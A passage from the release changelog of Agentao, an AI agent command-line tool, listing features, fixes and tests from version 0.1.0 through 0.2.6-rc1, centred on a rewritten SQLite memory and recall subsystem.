scoring, and CLI surface are byte-identical to the RC; only
`.github/workflows/*.yml` was touched.

---

## [0.2.6-rc1] — 2026-04-09

Headline: complete memory subsystem rewrite. SQLite replaces the old JSON
files; persistent memories, session summaries, and dynamic recall candidates
are now distinct, structured data types; conservative rule-based
crystallization sediments user statements into a review queue rather than
silently writing.

### Added

- **SQLite-backed memory subsystem** — `agentao/memory/`
  - Two stores: `.agentao/memory.db` (project) and `<home>/.agentao/memory.db` (user)
  - Schema v3 with `memories`, `session_summaries`, `memory_review_queue`,
    `memory_events`, `schema_meta`
  - Three data types modeled separately: persistent `MemoryRecord`,
    `SessionSummaryRecord`, in-memory `RecallCandidate`
- **Two prompt-injection blocks** built per turn
  - `<memory-stable>`: durable facts (`get_stable_entries()` policy:
    user-scope always, structural types always, project_fact/note capped at
    3 most-recent) plus a pre-reserved cross-session summary tail
  - `<memory-context>`: top-k recall candidates scored against the current
    user query
- **Cross-session summary recall** — `MemoryManager.get_cross_session_tail()`
  surfaces summaries from prior sessions through `<memory-stable>` so
  conversation continuity survives a restart, not only an in-process
  compaction
- **`MemoryRetriever` with five-factor scoring**
  - tag match (4.0, dampened to 1.5/2.5 for ≤2-token queries to prevent
    single-tag over-recall)
  - title Jaccard (3.0)
  - tokenized keyword match (2.0; compound keywords like `agent.py` are
    sub-tokenized so they match a query token `agent`)
  - content snippet match on first 500 chars (1.0)
  - filepath hint from context (2.0)
  - recency / staleness modifiers
  - CJK bigram tokenization, light Latin normalization (plurals, version
    prefixes), Latin↔CJK boundary splitting, dynamic char budget,
    `exclude_ids` parameter so dynamic recall never duplicates stable entries
- **Conservative rule-based crystallization with review queue**
  - `MemoryCrystallizer` rule patterns extract preference / constraint /
    decision / workflow only, in English and Chinese
  - Extraction runs on **raw user messages** (`extract_from_user_messages`),
    never on LLM-generated summary prose — assistant narration that happens
    to contain pattern words can never trigger a false match
  - Candidates land in `memory_review_queue` with `source="crystallized"`,
    not silently into live memories
  - Repetition aggregation: same `(scope, key)` matched in multiple user
    messages folds into one row with incremented `occurrences`; confidence
    is auto-raised to `inferred` at 2+ hits
  - Auto-trigger inside `ContextManager.compress_messages()` (Step 4b),
    against the about-to-be-compacted user-message window
- **CLI memory commands**: `/memory list/search/tag/delete/clear/user/project/session/status/crystallize/review`
  including `/memory review approve <id>` and `/memory review reject <id>`
- **Recall observability**: `/memory status` reports retrieval hits, recall
  errors, last error message, stable block size, and latest session summary
  size
- **`clear_all_session_summaries()`** for hard reset across all sessions
- **Memory subsystem decoupled from the LLM stack** —
  `agentao/__init__.py` uses PEP 562 `__getattr__` for lazy `Agentao` /
  `SkillManager` resolution, so `import agentao.memory` no longer pulls
  `openai`, `mcp`, `agentao.tools.*`, or `agentao.llm.*`. Cold import:
  **334 ms → 35 ms** (~10×); zero heavy modules leaked. Locked in by
  subprocess-isolated regression tests in `tests/test_memory_decoupling.py`

### Changed

- **Search unified across five fields** — `SQLiteMemoryStore.search_memories`
  LIKEs over `title`, `content`, `key_normalized`, `tags_json`, and
  `keywords_json` (was three). `/memory search` and `MemoryRetriever` now
  cover the same surface
- **Stable block budget eviction is recency-priority** — under budget
  pressure, the renderer admits records newest-first (greedy fit walking
  records in reverse) so a fresh decision/constraint is never crowded out
  by long-tail history. Survivors render in created_at-ASC order so the
  prompt-cache prefix stays stable across turns
- **Review queue duplicate folding refreshes ALL presentation fields** —
  re-hits update `type`, `title`, `content`, `tags_json` (not just
  `evidence` / `occurrences`) so the reviewer always sees the latest
  extraction instead of the first one
- **`/memory clear` and `/clear`** now wipe ALL session summaries via
  `clear_all_session_summaries()`. Previously they only deleted the current
  session, leaving prior-session summaries to silently resurface via the
  cross-session tail
- **`MemoryManager.save_session_summary()`** is now a pure persistence call.
  Crystallization moved upstream to `compress_messages()` so it sees raw
  user text instead of LLM-narrated summaries
- **Manager facade methods** rewired: `crystallize_recent_sessions(limit)`
  → `crystallize_user_messages(messages)`; same approve/reject API
- **`MemoryGuard.classify_type` / `classify_scope`** drive tag-based memory
  type and scope inference

### Removed

- `pinned`, `ttl_days`, `expires_at` fields from `MemoryRecord` — added
  speculatively, never had a functional write path. SQL schema bumped to v3
  with a `DROP COLUMN` migration for existing databases (silent skip on
  SQLite < 3.35.0)
- `MemoryCrystallizer.extract_from_sessions()` — operated on LLM-narrated
  session summaries, exactly the regex-on-summary path the new design
  rejects
- `MemoryManager.crystallize_recent_sessions()` — superseded by
  `crystallize_user_messages()`

### Fixed

- **`/new` was wiping the just-finished session's summaries** — the branch
  called `clear_session()` before `archive_session()`, so cross-session
  recall lost the most recent context. `clear_session()` is no longer
  invoked from `/new`; `archive_session()` (in `on_session_start()`) is the
  correct primitive. (Codex P2)
- **`Agentao._extract_context_hints` read the wrong key on text blocks** —
  list-shaped message content had `block.get("content")` instead of
  `block.get("text")`, silently dropping every multimodal/tool-use message
  and breaking `filepath_hint` scoring. Now matches the canonical
  `{"type": "text", "text": ...}` shape used by `_format_for_summary` and
  `_user_message_text`. (Codex P2)
- **Recall errors are now observable** — exceptions inside
  `MemoryRetriever.recall_candidates()` log a WARNING with traceback,
  increment `_error_count`, and record `_last_error` instead of being
  swallowed silently
- **`<memory-stable>` cross-session tail is pre-reserved** so persistent
  facts can never crowd out the previous-session summary
- **Dynamic recall hard budget** — `render_dynamic_block()` enforces
  `DYNAMIC_RECALL_MAX_CHARS` (~1200) and trims candidates that don't fit
- **Stable block budget pre-reservation refactor** uses a deterministic
  greedy fit instead of "stop at first overflow"

### Tests

- ~300 new memory-subsystem tests across `test_memory_store.py`,
  `test_memory_manager.py`, `test_memory_session.py`, `test_memory_renderer.py`,
  `test_retriever.py`, `test_crystallizer.py`, `test_memory_guards.py`,
  `test_memory_injection.py`, and `test_memory_decoupling.py`
- Suite total: **657 passing**, 1 skipped, 0 failing
- Notable regression guards:
  - `test_new_session_flow_preserves_cross_session_recall` (Codex P2 fix)
  - `test_extracts_paths_from_list_text_blocks` (Codex P2 fix)
  - `test_budget_eviction_preserves_newest_decision` (eviction priority)
  - `test_assistant_narration_does_not_trigger` (crystallization safety)
  - `test_clear_all_session_summaries_removes_cross_session_summaries`
  - `test_search_unified_finds_record_via_any_field`

---

## [0.2.5] — 2026-04-07

### Added

- **`agentao init` setup wizard** — first-run interactive bootstrap for
  `.agentao/` config, API keys, and skill discovery
- **Background agent lifecycle** — pending state, cancellation token plumbing,
  on-disk persistence so the dashboard survives restarts
- **`cwd/skills/`** added as a third highest-priority skills layer
  (overrides project and bundled skills); two-layer scan with first-run
  bootstrap of bundled skills
- **Windows compatibility** for the shell tool and terminal handling
- **130 new tests** covering permissions, skills, MCP, and background agents
- README "Minimum Viable Configuration" section

### Changed

- Bundled office / pdf / ocr skills removed from the default install
  (slimmer wheel; users opt in via the `pdf` / `excel` / `image` extras)
- Install path unified to `pip install agentao` across docs and README
- ChatAgent / Claude naming remnants cleaned up

### Packaging / CI

- GitHub Actions workflow with test / build / smoke matrix
- PyPI release workflows
- `main.py` and `.claude/` excluded from sdist
- `skills/skill-creator` included in wheel; other internal skills marked private

### Fixed

- `/plan save` CLI command removed to match the documented plan-mode v2
  contract (model-driven `plan_save` tool only)

---

## [0.2.3] — 2026-04-06

### Added
- **Plan mode v2** — tool-driven save/finalize workflow
  - `plan_save(content)` tool: persists a draft and returns a `draft_id`
  - `plan_finalize(draft_id)` tool: triggers the approval prompt; stale IDs are rejected
  - Approval prompt shows the full plan before asking "Execute this plan? [y/N]"
  - One-shot `consume_approval_request()` flag prevents repeated approval prompts
  - Auto-save fallback skipped when a draft is already finalized
- `agentao/plan/` sub-package: `session.py` (3-state FSM), `controller.py` (single exit path), `prompt.py` (mandatory turn protocol)
- 44 new tests covering FSM transitions, lifecycle, tools, and prompt structure

### Changed
- Plan approval prompt now only appears after the model explicitly calls `plan_finalize`
- `/plan save` removed as a CLI command; saving is now model-driven via the `plan_save` tool

### Fixed
- Finalized drafts can no longer be overwritten by the auto-save fallback path

### Packaging
- Added MIT `LICENSE` file (Bo Jin)
- Heavy optional dependencies (`pymupdf`, `pdfplumber`, `pandas`, `openpyxl`, `Pillow`, `pycryptodome`, `google-genai`) moved to optional extras: `pdf`, `excel`, `image`, `crypto`, `google`; `full` installs everything
- `skills/` and `workspace/` excluded from both wheel and sdist
- `requires-python` lowered from `>=3.12` to `>=3.10`
- Added `authors`, `license`, `keywords`, `classifiers`, `[project.urls]`
- Version is now defined once in `agentao/__init__.py` and read dynamically by hatchling

## [0.2.1] — 2026-03-xx

### Added
- **Permission mode system** — three named presets: `read-only`, `workspace-write` (default), `full-access`
- `/mode` command to switch and persist permission mode to `.agentao/settings.json`
- Plan mode enforced via `PLAN` permission preset (no writes, no dangerous shell)
- Mode restored exactly on `/plan implement` or `/plan clear`

### Changed
- Tool confirmation now driven by the active permission mode rather than per-tool flags
- `/clear` resets permission escalation (`allow_all_tools`) back to False

---

## [0.2.0] — 2026-03-xx

### Added
- **Plan mode** — `/plan` enters a read-only research-and-draft workflow; agent proposes a structured Markdown plan before any mutations
- **Display engine v2** — semantic tool headers (`→ read`, `← edit`, `$ shell`, `✱ search`), buffered output, tail-biased truncation, diff rendering, warning consolidation, live elapsed timer
- **Background agent dashboard** — `/agents`, `/agent dashboard`, `/agent status`
- **Transport protocol** — decoupled runtime from UI via `EventType` stream

### Fixed
- Streaming fallback, thinking handler scope, on_max_iterations guard
- Buffer all shell output; robust `\r`/ANSI/CRLF handling

---

## [0.1.11] — 2026-02-xx

### Added
- **Three-tier context compression** — microcompaction (55% usage) + LLM summarization (65%) + circuit breaker after 3 failures
- Structured 9-section LLM summary; partial compaction keeps last 20 messages verbatim
- Three-tier overflow recovery on context-too-long API error
- **Three-tier token counting** — real `prompt_tokens` from API → `count_tokens` API → local estimator (tiktoken / CJK heuristic)
- `/context` command with token breakdown by component
- Background agent push via `CancellationToken`

---

## [0.1.8] — 2026-01-xx

### Added
- **Sub-agent system** — foreground and background sub-agents with parent context injection and stats footer
- `/agent bg <name> <task>` for background execution
- Tool output file saving, head+tail truncation, per-line length limit
- `/new` command; auto `max_completion_tokens`; session lifecycle hooks

---

## [0.1.5] — 2025-12-xx

### Added
- **Task checklist** (`todo_write`) — LLM-managed task list injected into system prompt; visible via `/todos`
- **MCP (Model Context Protocol)** support — stdio and SSE transports; `mcp_*` tool registration
- **Memory management** — persistent `.agentao_memory.json`; `save_memory`, `search_memory`, `delete_memory` tools; `/memory` commands
- **Permission system** — per-tool confirmation with single-key menu; session escalation with **2** (Yes to all)
- Cognitive Resonance — automatic memory recall with injection confirmation before each response
- Session save/resume (`/sessions`)

---

## [0.1.1] — 2025-11-xx

### Added
- Renamed to **Agentao** (Agent + Tao)
- Gemini provider support (`google-genai`)
- `web_fetch` with automatic crawl4ai fallback for JS-heavy pages
- `/confirm`, `/stream`, `/tools`, `/provider` commands
- Sub-agent system (early version)
- `ask_user` tool for LLM-initiated clarification
- `-p` / `--print` flag for non-interactive print mode
- Multi-line paste via `prompt_toolkit`; single-key confirmation via `readchar`

### Changed
- System prompt: reliability principles, structured reasoning (Action / Expectation / If wrong), operational guidelines
- Context management: `ContextManager`, pinned messages, tool result truncation

---

## [0.1.0] — 2025-10-xx

### Added
- Initial release as **ChatAgent**
- CLI chat loop with OpenAI-compatible API
- Tool system: `read_file`, `write_file`, `replace`, `glob`, `grep`, `run_shell_command`, `web_fetch`, `web_search`, `save_memory`
- Skills system — auto-discovery from `skills/` with YAML frontmatter
- `AGENTAO.md` auto-loading for project-specific instructions
- Current date injected as `<system-reminder>`
- Complete LLM interaction logging to `agentao.log`
